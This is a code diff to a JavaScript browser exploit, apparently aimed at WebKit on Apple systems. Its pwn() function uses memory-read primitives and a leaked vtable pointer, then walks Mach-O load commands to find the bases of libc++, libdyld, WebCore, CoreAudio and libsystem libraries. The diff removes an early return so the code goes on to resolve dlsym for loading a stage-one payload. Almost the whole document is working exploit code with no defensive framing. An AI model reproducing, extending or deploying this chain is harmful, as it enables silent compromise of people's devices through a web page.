@@ -170,11 +170,15 @@ function find_dylib_by_name(macho_base, name) {
         dylib_name = get_dylib_name(next_dylib);
         // log(`[*] dylib_name: ${dylib_name}`);    //FOR CHECK if it's working
 
-        if(dylib_name.includes(name))
-            return macho_base;
+        if(dylib_name.includes(name)) {
+            log(`[*] dylib_name: ${dylib_name}`);
+            return next_dylib;
+        }
 
         macho_base = next_dylib;
     }
+
+    return 0;
 }
 
 function pwn() {
@@ -304,6 +308,7 @@ function pwn() {
     var vtab_addr = read64(el_addr);
     log(`[*] vtab_addr = ${(vtab_addr)}`);
 
+    // Find libcpp_base
     var adrpldr_ZSt7nothrow_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
     adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x95000);
 
@@ -365,6 +370,8 @@ function pwn() {
         libcpp1_base = Sub(libcpp1_base, 0x1000);
         try_count++;
     }
+
+    //Libs Base
     log(`[+] libcpp_base: ${libcpp1_base}, try_count: ${try_count}`);
     
     var libdyld_base = find_dylib_by_name(libcpp1_base, "libdyld")
@@ -376,7 +383,7 @@ function pwn() {
     var coreaudio_base = find_dylib_by_name(libcpp1_base, "CoreAudio")
     log(`[+] coreaudio_base: ${coreaudio_base}`);
 
-    var webcore_base = find_dylib_by_name(libcpp1_base, "WebCore")
+    var webcore_base = find_dylib_by_name(libcpp1_base, "/System/Library/PrivateFrameworks/WebCore.framework/WebCore")
     log(`[+] webcore_base: ${webcore_base}`);
 
     var libsystem_platform_base = find_dylib_by_name(libcpp1_base, "libsystem_platform")
@@ -385,25 +392,8 @@ function pwn() {
     var libsystem_kernel_base = find_dylib_by_name(libcpp1_base, "libsystem_kernel")
     log(`[+] libsystem_kernel_base: ${libsystem_kernel_base}`);
 
-
     // remove this "return" if finished patchfinder
-    return;
-
-    // Libs Base
-    var webcore_base = Sub(vtab_addr, offsets.WEBCORE_BASE);
-    log(`[+] webcore base = ${(webcore_base)} -> ${read64(webcore_base)}`);
-    var jsc_base = Sub(webcore_base, offsets.JSC_BASE);
-    log(`[+] jsc base = ${(jsc_base)} -> ${read64(jsc_base)}`); 
-    var coreaudio_base = Sub(webcore_base, offsets.COREAUDIO_BASE);
-    log(`[+] coreaudio base = ${(coreaudio_base)} -> ${read64(coreaudio_base)}`); 
-    var libcpp1_base = Sub(webcore_base, offsets.LIBCPP1_BASE);
-    log(`[+] libcpp1 base = ${(libcpp1_base)} -> ${read64(libcpp1_base)}`); 
-    var libsystem_platform_base = Sub(webcore_base, offsets.LIBSYSTEM_PLATFORM_BASE);
-    log(`[+] libsystem_platform base = ${(libsystem_platform_base)} -> ${read64(libsystem_platform_base)}`);
-    var libsystem_kernel_base = Sub(webcore_base, offsets.LIBSYSTEM_KERNEL_BASE);
-    log(`[+] libsystem_kernel base = ${(libsystem_kernel_base)} -> ${read64(libsystem_kernel_base)}`);
-    var libdyld_base = Sub(webcore_base, offsets.LIBDYLD_BASE);
-    log(`[+] libdyld base = ${(libdyld_base)} -> ${read64(libdyld_base)}`);
+    // return;
 
     // needed arguments to call stage1's _load
     var dlsym = Add(libdyld_base, offsets.dlsym);
